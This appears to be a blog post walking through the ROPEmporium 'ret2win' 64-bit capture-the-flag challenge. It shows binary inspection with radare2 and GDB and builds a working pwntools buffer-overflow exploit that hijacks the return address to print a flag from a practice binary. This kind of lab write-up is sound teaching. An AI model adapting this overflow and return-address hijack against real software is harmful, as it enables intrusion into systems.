<!DOCTYPE html>
<html lang="en-us">
  <head>
    
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="generator" content="Hugo 0.73.0 with theme Tranquilpeak 0.4.7-BETA">
<meta name="author" content="Thieu Nguyen">
<meta name="keywords" content="">
<meta name="description" content="Doing a series on ROP and ROPEmporium, starting out with a simple ret2win">


<meta property="og:description" content="Doing a series on ROP and ROPEmporium, starting out with a simple ret2win">
<meta property="og:type" content="article">
<meta property="og:title" content="ROPEmporium: 0-Ret2Win (64-bit)">
<meta name="twitter:title" content="ROPEmporium: 0-Ret2Win (64-bit)">
<meta property="og:url" content="https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">
<meta property="twitter:url" content="https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">
<meta property="og:site_name" content="Thieu Nguyen&#39;s Blog">
<meta property="og:description" content="Doing a series on ROP and ROPEmporium, starting out with a simple ret2win">
<meta name="twitter:description" content="Doing a series on ROP and ROPEmporium, starting out with a simple ret2win">
<meta property="og:locale" content="en-us">

  
    <meta property="article:published_time" content="2019-08-08T00:00:00">
  
  
    <meta property="article:modified_time" content="2019-08-08T00:00:00">
  
  
  
    
      <meta property="article:section" content="Exploit-Development">
    
      <meta property="article:section" content="ROPEmporium">
    
      <meta property="article:section" content="CTF">
    
  
  
    
      <meta property="article:tag" content="ctf">
    
      <meta property="article:tag" content="dev">
    
      <meta property="article:tag" content="getting-started">
    
      <meta property="article:tag" content="ropemporium">
    
      <meta property="article:tag" content="rop">
    
      <meta property="article:tag" content="exploit">
    
  


<meta name="twitter:card" content="summary">

  <meta name="twitter:site" content="@thieunguyen5991">


  <meta name="twitter:creator" content="@thieunguyen5991">






  <meta property="og:image" content="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/exploit-development-1280x600.jpg">
  <meta property="twitter:image" content="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/exploit-development-1280x600.jpg">


  <meta property="og:image" content="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/exploit-development-1280x600.jpg">
  <meta property="twitter:image" content="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/exploit-development-1280x600.jpg">




  <meta property="og:image" content="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=640">
  <meta property="twitter:image" content="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=640">


    <title>ROPEmporium: 0-Ret2Win (64-bit)</title>

    <link rel="icon" href="https://thieunguyen5991.github.io/favicon.png">
    

    

    <link rel="canonical" href="https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
    
    
    <link rel="stylesheet" href="https://thieunguyen5991.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
    
    

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-115328400-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="5">
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://thieunguyen5991.github.io/">Thieu Nguyen&#39;s Blog</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://thieunguyen5991.github.io/#about">
    
    
    
      
        <img class="header-picture" src="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=90" alt="Author&#39;s picture" />
      
    
    </a>
  
</header>

      <nav id="sidebar" data-behavior="5">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://thieunguyen5991.github.io/#about">
          <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=110" alt="Author&#39;s picture" />
        </a>
        <h4 class="sidebar-profile-name">Thieu Nguyen</h4>
        
          <h5 class="sidebar-profile-bio">Knowledge is power, but sharing it is the way to achieve immortality.</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">Home</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/categories">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">Categories</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">Tags</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/archives">
    
      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
      
      <span class="sidebar-button-desc">Archives</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/page/about-me">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">About Me</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/thieunguyen5991" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://twitter.com/thieunguyen5991" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
      
      <span class="sidebar-button-desc">Twitter</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://keybase.io/thieunguyen5991" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-code-fork"></i>
      
      <span class="sidebar-button-desc">Keybase.io</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/index.xml">
    
      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
      
      <span class="sidebar-button-desc">RSS</span>
    </a>
  </li>


    </ul>
  </div>
</nav>

      
  <div class="post-header-cover
              text-center
              post-header-cover--partial"
       style="background-image:url('/img/posts/2019/08/ropemporium-0-ret2win/exploit-development-1280x600.jpg')"
       data-behavior="5">
    
  </div>


      <div id="main" data-behavior="5"
        class="hasCover
               hasCoverMetaOut
               ">
        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
          
          
            <div class="post-header main-content-wrap text-center">
  
    <h1 class="post-title" itemprop="headline">
      ROPEmporium: 0-Ret2Win (64-bit)
    </h1>
  
  
  <div class="postShorten-meta post-meta">
    
      <time itemprop="datePublished" datetime="2019-08-08T00:00:00Z">
        
  August 8, 2019

      </time>
    
    
  
  
    <span>in</span>
    
      <a class="category-link" href="https://thieunguyen5991.github.io/categories/exploit-development">Exploit-Development</a>, 
    
      <a class="category-link" href="https://thieunguyen5991.github.io/categories/ropemporium">ROPEmporium</a>, 
    
      <a class="category-link" href="https://thieunguyen5991.github.io/categories/ctf">CTF</a>
    
  

  </div>

</div>
          
          <div class="post-content markdown" itemprop="articleBody">
            <div class="main-content-wrap">
              <p>So i had an idea for a long time, that i really should document the commands and programs that i use for pwning especially ROP based exploits. But since i lately ran through the ROPEmporium Challenges i thought, might as well make it a series on the blog. Now i assume that you as a reader already have some experience in creating buffer overflow exploits where you jump to the stack and execute shellcode.</p>
<h2 id="what-is-return-oriented-programming-rop">What is Return Oriented Programming (ROP)?</h2>
<blockquote>
<p><strong>Return-oriented programming</strong> ( <strong>ROP</strong> ) is a <a href="https://en.wikipedia.org/wiki/Computer_security_exploit">computer security exploit</a> technique that allows an attacker to execute code in the presence of security defenses such as <a href="https://en.wikipedia.org/wiki/Executable_space_protection">executable space protection</a> and <a href="https://en.wikipedia.org/wiki/Code_signing">code signing</a>.</p>
</blockquote>
<blockquote>
<p>In this technique, an attacker gains control of the <a href="https://en.wikipedia.org/wiki/Call_stack">call stack</a> to hijack program <a href="https://en.wikipedia.org/wiki/Control_flow">control flow</a> and then executes carefully chosen <a href="https://en.wikipedia.org/wiki/Machine_instruction">machine instruction</a> sequences that are already present in the machine&rsquo;s memory, called &ldquo;gadgets&rdquo;<br>
Source: <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">https://en.wikipedia.org/wiki/Return-oriented_programming</a></p>
</blockquote>
<h2 id="setup">Setup</h2>
<p>First of all the setup that I&rsquo;ll be using might not be what you have, either way here&rsquo;s the list that I&rsquo;m going to be working with:</p>
<ul>
<li>IDE: Atom</li>
<li>Python2.7 with pwntools</li>
<li>radare2 disassembler</li>
<li>GDB with GDB Enhanced Features (GEF)</li>
</ul>
<p>So first of all lets start with downloading the binary that we are supposed to exploit</p>
<pre><code>root@linux:~/ret2win# wget https://ropemporium.com/binary/ret2win.zip
root@linux:~/ret2win# unzip ret2win.zip
root@linux:~/ret2win# ls
flag.txt ret2win ret2win.zip
</code></pre><p>So that&rsquo;s done, Lets start by analyzing the ret2win binary</p>
<pre><code>root@linux:~/ret2win# file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a871295b6234edb261710bcc73a8c03e3c0f601d, not stripped
</code></pre><p>So two things stand out, <em>ELF 64-bit</em> and <em>not stripped.</em> Now we should already anticipated the ELK 64-bit since we downloaded the 64-bit version of ret2win, the <em>not stripped</em> though means that we have the symbols available to us. which will make reversing the binary a bit easier.</p>
<h2 id="radare2-reversing">Radare2 Reversing</h2>
<p>In the challenge description, they stated that there was a function in the binary called <em>ret2win,</em> which basically means &ldquo;return here to win(print the flag)&rdquo;. Before we dive into radare2 its good practice to look what security the binary has been compiled with.</p>
<pre><code>root@Valkyrie:~/Documents/courses/ropemporium/0-ret2win# rabin2 -I ret2win
arch x86
baddr 0x400000
binsz 7071
bintype elf
bits 64
canary false
class ELF64
compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crypto false
endian little
havecode true
intrp /lib64/ld-linux-x86-64.so.2
laddr 0x0
lang c
linenum true
lsyms true
machine AMD x86-64 architecture
maxopsz 16
minopsz 1
nx true
os linux
pcalign 0
pic false
relocs true
relro partial
rpath NONE
sanitiz false
static false
stripped false
subsys linux
va true
</code></pre><p>Just to confirm that the <em>nx</em> bit is true, which means that we cannot place executable shellcode on the stack and that points to a ROP based exploit. Now lets fire up radare2 in order to analyze the assembly and symbols looking for that ret2win function.</p>


 
  
  
  
  
    
  
    
      
    
  

<div class="figure center" >
  
    <a class="fancybox" href="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image.png" title="Radare2 Analyzing" data-fancybox-group="">
  
    <img class="fig-img" src="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image.png"  alt="Radare2 Analyzing">
  
    </a>
  
   
    <span class="caption">Radare2 Analyzing</span>
  
</div>

<p>The two command are <code>fs symbols</code> in order to select the symbols space to list all flags, and <code>f | grep ret2win</code> So that we can search the symbols for the address to ret2win function. Analyzing the function ret2win we can see that it calls the string &ldquo;/bin/cat flag.txt&rdquo; using system, that will print us the flag.</p>


 
  
  
  
  
    
  
    
      
    
  

<div class="figure center" >
  
    <a class="fancybox" href="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-1.png" title="Radare2 Symbols" data-fancybox-group="">
  
    <img class="fig-img" src="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-1.png"  alt="Radare2 Symbols">
  
    </a>
  
   
    <span class="caption">Radare2 Symbols</span>
  
</div>

<h2 id="going-for-the-pwn">Going for the pwn!</h2>
<p>Now lets start by looking at creating the exploit itself, pwntools comes with an awesome function where you can easily create a template, or stubcode for CTF-exploits.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">root<span style="color:#a6e22e">@Valkyrie</span>:<span style="color:#f92672">~/</span>Documents<span style="color:#f92672">/</span>courses<span style="color:#f92672">/</span>ropemporium<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span><span style="color:#f92672">-</span>ret2win<span style="color:#75715e"># pwn template --host 127.0.0.1 --port 31337 ret2win --quiet</span>
<span style="color:#75715e">#!/usr/bin/env python2</span>
<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;ret2win&#39;</span>)

host <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>HOST <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
port <span style="color:#f92672">=</span> int(args<span style="color:#f92672">.</span>PORT <span style="color:#f92672">or</span> <span style="color:#ae81ff">31337</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">local</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    io <span style="color:#f92672">=</span> connect(host, port)
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
        gdb<span style="color:#f92672">.</span>attach(io, gdbscript<span style="color:#f92672">=</span>gdbscript)
    <span style="color:#66d9ef">return</span> io

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
        <span style="color:#66d9ef">return</span> local(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> remote(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)

gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">break *0x{exe.symbols.main:x}
</span><span style="color:#e6db74">continue
</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())

<span style="color:#75715e"># -- Exploit goes here --</span>

io <span style="color:#f92672">=</span> start()

io<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>When calling the python code with the following arguments</p>
<ul>
<li>LOCAL - Exploit the local binary</li>
<li>DEBUG - Exploit with Debug input/output</li>
<li>GDB - Run the exploit together with a GDB session attached</li>
</ul>
<p>Running the exploit without any arguments simply try to exploit the IP and port stated, but since ROPEmporium is only local binaries we wont bother trying something remote.</p>
<p>This will ensure some reproducibility every time we change something in the exploit code and exploit the service.</p>
<h3 id="rip">RIP</h3>
<p>Now because this is a 64-bit program contrary to a 32-bit where we  want to control the EIP register, this time controlling RIP is the key to inject out own code.</p>
<p>In order to determine the amount of junk to overwrite the RIP, we have to open it up in GDB and create a unique pattern.</p>


 
  
  
  
  
    
  
    
      
    
  

<div class="figure center" >
  
    <a class="fancybox" href="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-2.png" title="GDB Debugging" data-fancybox-group="">
  
    <img class="fig-img" src="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-2.png"  alt="GDB Debugging">
  
    </a>
  
   
    <span class="caption">GDB Debugging</span>
  
</div>

<p>Now run the program and when you are required to input data, paste the unique string, which if the string is long enough, will crash the execution of the binary.</p>


 
  
  
  
  
    
  
    
      
    
  

<div class="figure center" >
  
    <a class="fancybox" href="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-3.png" title="GDB Debugging" data-fancybox-group="">
  
    <img class="fig-img" src="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-3.png"  alt="GDB Debugging">
  
    </a>
  
   
    <span class="caption">GDB Debugging</span>
  
</div>

<p>The important register is the stack pointer <em>$rsp.</em> Now still GDB and doing a pattern search for the string in <em>$rsp</em> GEF will display the offset at which we control the register.</p>


 
  
  
  
  
    
  
    
      
    
  

<div class="figure center" >
  
    <a class="fancybox" href="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-5.png" title="GDB Debugging" data-fancybox-group="">
  
    <img class="fig-img" src="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-5.png"  alt="GDB Debugging">
  
    </a>
  
   
    <span class="caption">GDB Debugging</span>
  
</div>

<p>The other notable thing from the GDB output is that we are required to input data after &ldquo;&gt; &ldquo;. Both of these two pieces of data will be used in the exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># -- Exploit goes here --</span>
junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;BBBBBBBB&#39;</span> <span style="color:#75715e">#junk with the offset in order to overwrite RIP</span>

payload <span style="color:#f92672">=</span> junk <span style="color:#75715e">#Payload that will be sent to the binary</span>

io <span style="color:#f92672">=</span> start()
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>) <span style="color:#75715e">#pwn function &#34;Recieve data until symbol&#34;</span>
io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#send object ending with a carriage return</span>
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>This code will consistently crash the ret2win binary and running it with <code>./exploit.py LOCAL GDB</code> will attach a GDB session showing that $RSP is overwritten with <em>8*B.</em></p>


 
  
  
  
  
    
  
    
      
    
  

<div class="figure center" >
  
    <a class="fancybox" href="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-6.png" title="GDB Debugging" data-fancybox-group="">
  
    <img class="fig-img" src="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-6.png"  alt="GDB Debugging">
  
    </a>
  
   
    <span class="caption">GDB Debugging</span>
  
</div>

<h3 id="ret2win">Ret2Win</h3>
<p>Having the program crash is all fun and games, but we want that flag!</p>
<p>now since ROP is exploiting using library or binary &ldquo;gadgets&rdquo; we have to replace those <em>8*B</em> with a valid address to a function. Since we got that hint to use the ret2win (0x00400811) function  from ROPEmporium, lets do that.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># -- Exploit goes here --</span>
junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> <span style="color:#75715e">#junk with the offset in order to overwrite RIP</span>
ret2win <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400811</span>) <span style="color:#75715e">#gadget which executes /bin/cat flag.txt</span>

payload <span style="color:#f92672">=</span> junk <span style="color:#75715e">#Payload that will be sent to the binary</span>
payload <span style="color:#f92672">+=</span> ret2win

io <span style="color:#f92672">=</span> start()
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>) <span style="color:#75715e">#pwn function &#34;Recieve data until symbol&#34;</span>
io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#send object ending with a carriage return</span>
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>Running the exploit locally again results in a flag being printed to us!</p>


 
  
  
  
  
    
  
    
      
    
  

<div class="figure center" >
  
    <a class="fancybox" href="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-7.png" title="Flag" data-fancybox-group="">
  
    <img class="fig-img" src="https://thieunguyen5991.github.io/img/posts/2019/08/ropemporium-0-ret2win/image-7.png"  alt="Flag">
  
    </a>
  
   
    <span class="caption">Flag</span>
  
</div>

<h3 id="but-wait-theres-more">But wait&hellip; There&rsquo;s more!!!</h3>
<p>Yeah we got the flag. but to do something cool with pwntools since we are already using the python lib. Since the binary was not stripped (important), and pwntools automatically loads the binary into its context. Pwntools also loads the symbols, and their corresponding addresses which we can call in the exploit script. in other words we don&rsquo;t have to mess about with static addresses but can call the ret2win using pwntools symbols.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#Blog: https://blog.securitybits.io/2019/08/08/ropemporium-0-ret2win/</span>
<span style="color:#75715e">#!/usr/bin/env python2</span>
<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;ret2win&#39;</span>)

host <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>HOST <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
port <span style="color:#f92672">=</span> int(args<span style="color:#f92672">.</span>PORT <span style="color:#f92672">or</span> <span style="color:#ae81ff">31337</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">local</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    io <span style="color:#f92672">=</span> connect(host, port)
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
        gdb<span style="color:#f92672">.</span>attach(io, gdbscript<span style="color:#f92672">=</span>gdbscript)
    <span style="color:#66d9ef">return</span> io

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
        <span style="color:#66d9ef">return</span> local(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> remote(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)

gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">break *0x{exe.symbols.main:x}
</span><span style="color:#e6db74">continue
</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())

junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
ret2win <span style="color:#f92672">=</span> p64(exe<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>ret2win)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
payload <span style="color:#f92672">+=</span> junk
payload <span style="color:#f92672">+=</span> ret2win

io <span style="color:#f92672">=</span> start()

io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;:&#39;</span>)
log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;Flag: &#39;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>))
</code></pre></div><p>Github-Repo: <a href="https://github.com/Securitybits-io/ROPEmporium">https://github.com/Securitybits-io/ROPEmporium</a></p>

              
            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
            <div class="post-actions-wrap">
  
      <nav >
        <ul class="post-actions post-action-nav">
          
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://thieunguyen5991.github.io/2019/08/ropemporium-1-split-64-bit/" data-tooltip="ROPEmporium: 1-Split (64-bit)">
              
                  <i class="fa fa-angle-left"></i>
                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
                </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://thieunguyen5991.github.io/2019/06/voltage-glitching-on-the-cheap/" data-tooltip="Voltage glitching on the cheap">
              
                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                  <i class="fa fa-angle-right"></i>
                </a>
            </li>
          
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">
              <i class="fa fa-facebook-official"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">
              <i class="fa fa-google-plus"></i>
            </a>
          </li>
        
      
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  
</div>

            
          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2020 Thieu Nguyen. All Rights Reserved
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
        <div class="post-actions-wrap">
  
      <nav >
        <ul class="post-actions post-action-nav">
          
            <li class="post-action">
              
